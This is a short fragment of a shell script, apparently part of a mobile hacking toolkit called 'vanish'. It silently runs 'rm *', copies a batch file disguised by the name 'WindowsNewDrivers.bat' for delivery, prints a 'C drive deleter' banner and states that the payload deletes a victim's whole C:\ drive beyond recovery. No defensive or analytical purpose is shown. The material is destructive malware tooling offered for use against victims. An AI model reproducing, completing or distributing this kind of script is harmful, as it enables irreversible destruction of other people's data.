...
rm * >/dev/null 2>&1
cd $HOME
cp $HOME/vanish/core/src/windows/WindowsNewDrivers.bat /sdcard/vanrc >/dev/null 2>&1
clear
echo -e "\e[91m 
   ┌─┐  ┌┬┐┬─┐┬┬  ┬┌─┐  ┌┬┐┌─┐┬  ┌─┐┌┬┐┌─┐┬─┐
   │     ││├┬┘│└┐┌┘├┤    ││├┤ │  ├┤  │ ├┤ ├┬┘
...
"
echo
echo -e "         \e[91m[\e[0mThis will delete victims whole 
    C:\ drive and it really unrecoverable\e[91m]\e[0m"
cd $HOME/vanish/core/src/windows
link=$(cat cdrivedeleter)
